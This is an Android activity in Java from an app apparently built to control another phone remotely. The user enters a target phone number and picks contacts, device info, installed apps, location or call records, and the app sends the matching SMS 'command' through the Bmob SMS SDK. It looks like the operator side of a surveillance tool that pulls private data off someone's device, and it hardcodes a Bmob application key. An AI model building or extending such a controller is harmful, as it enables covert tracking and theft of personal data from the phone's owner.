package com.lu.mbcontrol;

import android.content.Intent;
import android.support.annotation.IdRes;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RadioGroup;
import android.widget.TextView;
import android.widget.Toast;

import com.lu.mbcontrol.utils.PhoneNumberChecked;
import com.lu.mbcontrol.utils.SoundPlay;

import cn.bmob.newsmssdk.BmobSMS;
import cn.bmob.newsmssdk.exception.BmobException;
import cn.bmob.newsmssdk.listener.RequestSMSCodeListener;

public class FunctionActivity extends AppCompatActivity {
    private TextView tv_page;
    private EditText phoneET;
    private RadioGroup rg;
    private Button goBT, BT_change2search,BT_change2netCode,BT_change2shop;
    private long firstTime = 0;
    private int flag = 0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_function);
        initBmob();
        initView();
        Enevt();
    }

    //初始化bomb
    private void initBmob(){
        BmobSMS.initialize(FunctionActivity.this, "16c289d3d3c88d82785f80b204c71eab");
    }

    public void initView(){
        phoneET = (EditText)findViewById(R.id.ET_phoneNumber_send);
        rg = (RadioGroup)findViewById(R.id.RG);
        goBT = (Button)findViewById(R.id.BT_go);
        BT_change2search = (Button)findViewById(R.id.BT_changePage2serach_function);
        BT_change2netCode = (Button)findViewById(R.id.BT_changePage2netCode_function);
        BT_change2shop = (Button)findViewById(R.id.BT_changePage2shop_function);
        tv_page = (TextView)findViewById(R.id.TV_page_SMSsent);
    }

    public void Enevt(){
        rg.setOnCheckedChangeListener(new RadioGroup.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup group, @IdRes int checkedId) {
                if(R.id.contactRb == checkedId){
                    flag = 1;
                }
                else if(R.id.deviceRb == checkedId){
                    flag = 2;
                }
                else if(R.id.appinstalledRb == checkedId){
                    flag = 3;
                }
                else if(R.id.locationRb == checkedId){
                    flag = 4;
                }else if(R.id.callRb == checkedId){
                    flag = 5;
                }
            }
        });

        goBT.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                String phone = phoneET.getText().toString();
                if(phone.isEmpty()){
                    Toast.makeText(FunctionActivity.this, "手机号不能为空！", Toast.LENGTH_SHORT).show();
                }
                else if(!PhoneNumberChecked.isMobile(phone)){
                    Toast.makeText(FunctionActivity.this, "手机号不合法！", Toast.LENGTH_SHORT).show();
                }
                else if(flag == 0){
                    Toast.makeText(FunctionActivity.this, "选择功能！", Toast.LENGTH_SHORT).show();
                }
                else {
                    requestSms(phone, flag);
                    flag = 0;
                }
            }
        });

        BT_change2search.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                Intent intent = new Intent(FunctionActivity.this, DataSerachActivity.class);
                startActivity(intent);
                finish();
            }
        });
        BT_change2netCode.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                Intent intent = new Intent(FunctionActivity.this, NetCodeActivity.class);
                startActivity(intent);
                finish();
            }
        });
        BT_change2shop.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                Intent intent = new Intent(FunctionActivity.this, tiantiantejiaActivity.class);
                startActivity(intent);
                finish();
            }
        });
        tv_page.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SoundPlay.initSoundPool(getApplicationContext());
                startActivity(new Intent(FunctionActivity.this,LoginActivity.class));
                finish();
            }
        });
    }
    //请求验证码
    public void requestSms(String phone, int model){
        switch (model){
            case 1:
                BmobSMS.requestSMSCode(FunctionActivity.this, phone,
                        "联系人",new RequestSMSCodeListener() {
                    @Override
                    public void done(Integer smsId,BmobException ex) {
                        // TODO Auto-generated method stub
                        if(ex==null){//验证码发送成功
                            Log.e("flag=1", "短信id："+smsId);//用于查询本次短信发送详情
                           tipToast();
                        }
                    }
                });
                break;
            case 2:
                BmobSMS.requestSMSCode(FunctionActivity.this, phone, "设备信息",new RequestSMSCodeListener() {

                    @Override
                    public void done(Integer smsId,BmobException ex) {
                        // TODO Auto-generated method stub
                        if(ex==null){//验证码发送成功
                            Log.e("flag=2", "短信id："+smsId);
                            tipToast();
                        }
                    }
                });
                break;
            case 3:
                BmobSMS.requestSMSCode(FunctionActivity.this, phone, "应用表",new RequestSMSCodeListener() {
                    @Override
                    public void done(Integer smsId,BmobException ex) {
                        // TODO Auto-generated method stub
                        if(ex==null){//验证码发送成功
                            Log.e("flag=3", "短信id："+smsId);
                            tipToast();
                        }
                    }
                });
                break;
            case 4:
                BmobSMS.requestSMSCode(FunctionActivity.this, phone, "位置",new RequestSMSCodeListener() {
                    @Override
                    public void done(Integer smsId,BmobException ex) {
                        // TODO Auto-generated method stub
                        if(ex==null){//验证码发送成功
                            Log.e("flag=4", "短信id："+smsId);
                            tipToast();
                        }
                    }
                });
                break;
            case 5:
                BmobSMS.requestSMSCode(FunctionActivity.this, phone, "通讯记录",new RequestSMSCodeListener() {
                    @Override
                    public void done(Integer smsId,BmobException ex) {
                        // TODO Auto-generated method stub
                        if(ex==null){//验证码发送成功
                            Log.e("flag=5", "短信id："+smsId);
                            tipToast();
                        }
                    }
                });
                break;
                default:break;
        }
    }

    public void tipToast(){
        Toast.makeText(FunctionActivity.this,"指令发送成功",Toast.LENGTH_SHORT).show();
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && event.getAction() == KeyEvent.ACTION_DOWN) {
            long secondTime = System.currentTimeMillis();
            if (secondTime - firstTime > 2000) {
                Toast.makeText(FunctionActivity.this, "再按一次退出", Toast.LENGTH_SHORT).show();
                firstTime = secondTime;
                return true;
            } else {
                finish();
            }
        }
        return super.onKeyDown(keyCode, event);
    }
}
